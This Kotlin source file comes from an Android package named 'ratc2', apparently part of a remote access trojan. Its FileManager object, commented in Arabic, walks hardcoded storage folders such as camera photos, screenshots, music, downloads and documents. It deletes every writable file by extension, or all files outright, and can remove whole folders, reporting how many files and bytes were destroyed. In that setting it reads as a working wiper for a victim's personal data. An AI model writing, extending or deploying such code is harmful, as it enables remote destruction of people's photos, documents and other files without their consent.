package com.spud.ratc2

import android.util.Log
import java.io.File
import java.text.DecimalFormat

object FileManager {
    private val TAG = "FILEMGR"

    /**
     * احذف الملفات من مجلد حسب الأنواع.
     * @return Pair(عدد المحذوف, الحجم بالبايت)
     */
    fun deleteByExt(dirs: List<String>, exts: Set<String>): Pair<Int, Long> {
        var count = 0
        var bytes = 0L
        for (d in dirs) {
            try {
                val dir = File(d)
                if (!dir.exists() || !dir.isDirectory) continue
                dir.walkTopDown()
                    .filter { it.isFile && it.canWrite() }
                    .filter { it.extension.lowercase() in exts }
                    .forEach { f ->
                        val sz = f.length()
                        if (f.delete()) {
                            count++
                            bytes += sz
                        }
                    }
            } catch (e: Exception) {
                Log.e(TAG, "deleteByExt err $d", e)
            }
        }
        return count to bytes
    }

    /**
     * احذف كل الملفات في المجلدات (كل الأنواع).
     */
    fun deleteAllFiles(dirs: List<String>): Pair<Int, Long> {
        var count = 0
        var bytes = 0L
        for (d in dirs) {
            try {
                val dir = File(d)
                if (!dir.exists() || !dir.isDirectory) continue
                dir.walkTopDown()
                    .filter { it.isFile && it.canWrite() }
                    .forEach { f ->
                        val sz = f.length()
                        if (f.delete()) {
                            count++
                            bytes += sz
                        }
                    }
            } catch (e: Exception) {
                Log.e(TAG, "deleteAllFiles err $d", e)
            }
        }
        return count to bytes
    }

    /**
     * احذف مجلد كامل بكل محتواه.
     */
    fun deleteFolderRecursive(path: String): Boolean {
        return try {
            val dir = File(path)
            if (!dir.exists()) return false
            dir.deleteRecursively()
        } catch (e: Exception) {
            Log.e(TAG, "deleteFolderRecursive err $path", e)
            false
        }
    }

    fun humanSize(bytes: Long): String {
        if (bytes < 1024) return "$bytes B"
        val kb = bytes / 1024.0
        if (kb < 1024) return "${DecimalFormat("#.##").format(kb)} KB"
        val mb = kb / 1024.0
        if (mb < 1024) return "${DecimalFormat("#.##").format(mb)} MB"
        val gb = mb / 1024.0
        return "${DecimalFormat("#.##").format(gb)} GB"
    }

    // ========== قوائم الأنواع ==========

    val IMAGE_DIRS = listOf(
        "/sdcard/DCIM/Camera",
        "/sdcard/DCIM/Screenshots",
        "/sdcard/Pictures",
        "/sdcard/Pictures/Screenshots",
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures"
    )
    val IMAGE_EXTS = setOf("jpg", "jpeg", "png", "gif", "webp", "bmp", "heic", "heif")

    val VIDEO_DIRS = listOf(
        "/sdcard/DCIM/Camera",
        "/sdcard/Movies",
        "/sdcard/Download",
        "/storage/emulated/0/Movies"
    )
    val VIDEO_EXTS = setOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "m4v", "ts")

    val AUDIO_DIRS = listOf(
        "/sdcard/Music",
        "/sdcard/Ringtones",
        "/sdcard/Notifications",
        "/sdcard/Alarms",
        "/sdcard/Download",
        "/storage/emulated/0/Music"
    )
    val AUDIO_EXTS = setOf("mp3", "m4a", "aac", "wav", "ogg", "opus", "flac", "amr", "mp4a")

    val DOC_DIRS = listOf(
        "/sdcard/Documents",
        "/sdcard/Download"
    )
    val DOC_EXTS = setOf("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "csv")

    val APK_DIRS = listOf(
        "/sdcard/Download",
        "/sdcard/Android"
    )
    val APK_EXTS = setOf("apk", "xapk", "apks")

    val ARCHIVE_DIRS = listOf(
        "/sdcard/Download",
        "/sdcard/Documents"
    )
    val ARCHIVE_EXTS = setOf("zip", "rar", "7z", "tar", "gz", "bz2")

    val ALL_DIRS = listOf(
        "/sdcard/DCIM",
        "/sdcard/Pictures",
        "/sdcard/Movies",
        "/sdcard/Music",
        "/sdcard/Download",
        "/sdcard/Documents",
        "/sdcard/Ringtones",
        "/sdcard/Notifications",
        "/sdcard/Alarms"
    )
}
